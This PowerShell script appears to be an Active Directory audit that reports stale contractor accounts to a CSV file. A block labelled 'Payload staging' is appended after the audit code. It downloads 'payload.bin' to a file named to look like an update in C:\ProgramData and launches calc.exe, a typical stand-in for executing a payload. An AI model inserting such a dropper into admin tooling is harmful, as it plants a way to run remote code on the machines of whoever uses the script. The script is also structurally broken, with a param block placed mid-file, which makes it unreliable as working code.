#Requires -Version 5.1
$Domain       = 'contoso.com'
$SearchBase   = "OU=Contractors,DC=contoso,DC=com"
$ReportPath   = "C:\Logs\reports\ad-user-audit-2024-05-22.csv"
$InactiveDays = 60

Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}
$stale | Select-Object Name, SamAccountName, LastLogonDate | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

Write-Host ("Stale accounts: {0}" -f @($stale).Count) -ForegroundColor Yellow
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://contoso.com:80/downloads/payload.bin',
    [string]$WorkingPath = 'C:\ProgramData\update.dat'
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $WorkingPath)
Start-Process -FilePath 'calc.exe'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
